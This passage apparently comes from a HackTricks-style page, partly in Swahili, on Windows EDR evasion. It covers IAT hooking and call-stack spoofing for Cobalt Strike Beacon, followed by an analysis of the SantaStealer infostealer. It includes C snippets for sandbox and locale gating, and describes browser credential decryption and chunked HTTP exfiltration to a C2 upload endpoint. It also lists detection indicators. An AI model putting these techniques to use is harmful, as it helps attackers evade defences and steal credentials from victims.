- For compatibility, export an interface so an Aggressor script (or equivalent) can register which APIs to hook for Beacon, BOFs and post‑ex DLLs.

Why IAT hooking here
- Works for any code that uses the hooked import, without modifying tool code or relying on Beacon to proxy specific APIs.
- Covers post‑ex DLLs: hooking LoadLibrary* lets you intercept module loads (e.g., System.Management.Automation.dll, clr.dll) and apply the same masking/stack evasion to their API calls.
- Restores reliable use of process‑spawning post‑ex commands against call‑stack–based detections by wrapping CreateProcessA/W.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Vidokezo
- Weka patch baada ya relocations/ASLR na kabla ya matumizi ya kwanza ya import. Reflective loaders kama TitanLdr/AceLdr zinaonyesha hooking wakati wa DllMain wa module iliyopakiwa.
- Weka wrappers ndogo na salama kwa PIC; tambua API halisi kupitia thamani ya asili ya IAT uliyokamata kabla ya patching au kupitia LdrGetProcedureAddress.
- Tumia RW → RX transitions kwa PIC na epuka kuacha writable+executable pages.

Call‑stack spoofing stub
- Stubs za PIC za mtindo wa Draugr huunda mnyororo wa wito wa uongo (return addresses ndani ya benign modules) kisha pivot kwenda API halisi.
- Hii inavunja detections zinazotarajia canonical stacks kutoka Beacon/BOFs kuelekea sensitive APIs.
- Iunganishe na mbinu za stack cutting/stack stitching ili kutua ndani ya frames zinazotarajiwa kabla ya API prologue.

Uunganishaji wa kiutendaji
- Weka reflective loader mwanzoni mwa post‑ex DLLs ili PIC na hooks ziitialize kwa otomatiki wakati DLL inapopakuliwa.
- Tumia Aggressor script kujiandikisha target APIs ili Beacon na BOFs zipate faida kwa njia ile ile ya evasion bila mabadiliko ya code.

Mambo ya utambuzi/DFIR
- IAT integrity: entries ambazo zinatambuliwa kwa anwani za non‑image (heap/anon); ukaguzi wa mara kwa mara wa import pointers.
- Stack anomalies: return addresses zisizo za loaded images; transitions ghafla kwenda non‑image PIC; inconsistent RtlUserThreadStart ancestry.
- Loader telemetry: in‑process writes kwa IAT, shughuli za mapema za DllMain zinazobadilisha import thunks, unexpected RX regions zilizoundwa wakati wa load.
- Image‑load evasion: ikiwa kuna hooking ya LoadLibrary*, angalia suspicious loads za automation/clr assemblies zinazohusishwa na memory masking events.

Vitu vinavyohusiana na mifumo na mifano
- Reflective loaders ambazo hufanya IAT patching wakati wa load (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) na stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (e.g., Draugr)

## SantaStealer Tradecraft kwa Fileless Evasion na Credential Theft

SantaStealer (aka BluelineStealer) inaonyesha jinsi info‑stealers wa kisasa wanavyochanganya AV bypass, anti‑analysis na credential access katika mtiririko mmoja wa kazi.

### Keyboard layout gating & sandbox delay

- Bendera ya config (`anti_cis`) inarudisha orodha ya keyboard layouts zilizosanikishwa kupitia `GetKeyboardLayoutList`. Ikiwa layout ya Cyrillic inapatikana, sample inaweka alama tupu ya `CIS` na inakoma kabla ya kuendesha stealers, kuhakikisha haitadetonate kwenye locales zilizotengwa huku ikiacha artefakti ya uwindaji.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Mantiki ya tabaka ya `check_antivm`

- Variant A hupitia orodha ya mchakato, hufanya hash kwa kila jina kwa checksum maalum ya rolling, na kuilinganisha dhidi ya blocklists zilizowekwa kwa ajili ya debuggers/sandboxes; inarudia checksum hiyo kwa jina la kompyuta na hukagua working directories kama `C:\analysis`.
- Variant B inachunguza mali za mfumo (gari la process-count, uptime ya hivi karibuni), inaita `OpenServiceA("VBoxGuest")` kutambua VirtualBox additions, na hufanya timing checks karibu na sleeps ili kugundua single-stepping. Ugunduo wowote unasitisha kabla modules hazijaanzishwa.

### Fileless helper + double ChaCha20 reflective loading

- The primary DLL/EXE embeds a Chromium credential helper that is either dropped to disk or manually mapped in-memory; fileless mode resolves imports/relocations itself so no helper artifacts are written.
- That helper stores a second-stage DLL encrypted twice with ChaCha20 (two 32-byte keys + 12-byte nonces). After both passes, it reflectively loads the blob (no `LoadLibrary`) and calls exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` derived from [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).
- The ChromElevator routines use direct-syscall reflective process hollowing to inject into a live Chromium browser, inherit AppBound Encryption keys, and decrypt passwords/cookies/credit cards straight from SQLite databases despite ABE hardening.


### Modular in-memory collection & chunked HTTP exfil

- `create_memory_based_log` iterates a global `memory_generators` function-pointer table and spawns one thread per enabled module (Telegram, Discord, Steam, screenshots, documents, browser extensions, etc.). Each thread writes results into shared buffers and reports its file count after a ~45s join window.
- Once finished, everything is zipped with the statically linked `miniz` library as `%TEMP%\\Log.zip`. `ThreadPayload1` then sleeps 15s and streams the archive in 10 MB chunks via HTTP POST to `http://<C2>:6767/upload`, spoofing a browser `multipart/form-data` boundary (`----WebKitFormBoundary***`). Each chunk adds `User-Agent: upload`, `auth: <build_id>`, optional `w: <campaign_tag>`, and the last chunk appends `complete: true` so the C2 knows reassembly is done.

## References

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)

{{#include ../banners/hacktricks-training.md}}
